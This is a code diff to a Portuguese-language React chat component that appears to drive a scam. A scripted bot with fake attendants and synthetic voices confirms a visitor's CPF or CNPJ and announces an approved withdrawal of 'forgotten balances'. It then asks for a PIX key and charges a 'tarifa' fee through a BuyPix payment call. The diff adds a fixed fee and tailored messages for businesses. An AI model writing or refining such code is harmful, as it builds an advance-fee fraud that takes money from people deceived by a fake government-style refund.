@@ -61,9 +61,9 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
       // Sorteia uma atendente
       const attendants = [
          { name: "Camila", voiceId: "EXAVITQu4vr4xnSDxMaL" },
-         { name: "Letícia", voiceId: "ThT5KcBeYPX3keUQqHPh" },
-         { name: "Amanda", voiceId: "GM2UA3fbsIaLHcswCDX9" },
-         { name: "Juliana", voiceId: "JBFqnCBsd6RMkjVDRZzb" }
+         { name: "Letícia", voiceId: "EXAVITQu4vr4xnSDxMaL" },
+         { name: "Amanda", voiceId: "EXAVITQu4vr4xnSDxMaL" },
+         { name: "Juliana", voiceId: "EXAVITQu4vr4xnSDxMaL" }
       ];
       const selectedAttendant = attendants[Math.floor(Math.random() * attendants.length)];
       setAttendant(selectedAttendant);
@@ -81,7 +81,11 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
 
       try {
         const res = await axios.get(`${API_URL}/api/config`);
-        if (res.data.tarifaTransicional) setTarifa(res.data.tarifaTransicional);
+        if (data.docType.toUpperCase() === 'CNPJ') {
+          setTarifa(15.00);
+        } else if (res.data.tarifaTransicional) {
+          setTarifa(res.data.tarifaTransicional);
+        }
       } catch (e) {
         console.error("Config fetch failed", e);
       }
@@ -124,10 +128,19 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         setTyping(true);
         await sleep(2000);
         setTyping(false);
-        addBotMessage(`Autenticação confirmada em nome de: **${name}**.\n\nVocê confirma que é você?`, [
-          { text: "Sim, sou eu", action: "confirm_identity_yes" },
-          { text: "Não, está errado", action: "confirm_identity_no" }
-        ]);
+
+        const isCnpj = data.docType.toUpperCase() === 'CNPJ';
+        if (isCnpj) {
+          addBotMessage(`Autenticação confirmada para a empresa: **${name}**.\n\nVocê confirma que é o representante legal?`, [
+            { text: "Sim, sou eu", action: "confirm_identity_yes" },
+            { text: "Não, está errado", action: "confirm_identity_no" }
+          ]);
+        } else {
+          addBotMessage(`Autenticação confirmada em nome de: **${name}**.\n\nVocê confirma que é você?`, [
+            { text: "Sim, sou eu", action: "confirm_identity_yes" },
+            { text: "Não, está errado", action: "confirm_identity_no" }
+          ]);
+        }
 
       } catch (e) {
         setTyping(false);
@@ -200,7 +213,12 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
           setTyping(true);
           setTimeout(() => {
             setTyping(false);
-            addBotMessage(`Parabéns, ${leadName}! A sua solicitação de saque foi aprovada no valor de ${leadValue} referentes a saldos esquecidos no CPF ${data.docValue}.`, undefined, "/assets/banners/banner_saque_aprovado.png");
+            const isCnpj = data.docType.toUpperCase() === 'CNPJ';
+            if (isCnpj) {
+              addBotMessage(`Parabéns, representante! A solicitação de saque da empresa **${leadName}** foi aprovada no valor de ${leadValue} referentes a saldos inativos vinculados ao CNPJ ${data.docValue}.`, undefined, "/assets/banners/banner_saque_aprovado.png");
+            } else {
+              addBotMessage(`Parabéns, ${leadName}! A sua solicitação de saque foi aprovada no valor de ${leadValue} referentes a saldos esquecidos no CPF ${data.docValue}.`, undefined, "/assets/banners/banner_saque_aprovado.png");
+            }
             
             setTimeout(() => {
               setTyping(true);
@@ -255,7 +273,12 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
 
       setTimeout(() => {
         setTyping(false);
-        addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, "/assets/banners/banner_pix.png");
+        const isCnpj = data.docType.toUpperCase() === 'CNPJ';
+        if (isCnpj) {
+          addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a Chave PIX da empresa (ou a sua Chave PIX de preferência):`, undefined, "/assets/banners/banner_pix.png");
+        } else {
+          addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, "/assets/banners/banner_pix.png");
+        }
         setAwaitingPix(true);
       }, 1500);
     }
@@ -303,7 +326,8 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
            name: leadName,
            attendantName: attendant.name,
            voiceId: attendant.voiceId,
-           value: leadValue
+           value: leadValue,
+           docType: data.docType
         });
         if (ttsRes.data.audioBase64) {
            const url = `data:audio/mp3;base64,${ttsRes.data.audioBase64}`;
@@ -314,7 +338,11 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
              audioRef.current.play().catch(e => console.log("Autoplay blocked:", e));
            }
         }
+      } catch (err: any) {
+         console.error("TTS generation error", err);
+      }
 
+      try {
         // Fetch BuyPix
         const pixRes = await axios.post(`${API_URL}/api/v1/buypix/create`, {
           amount: tarifa,
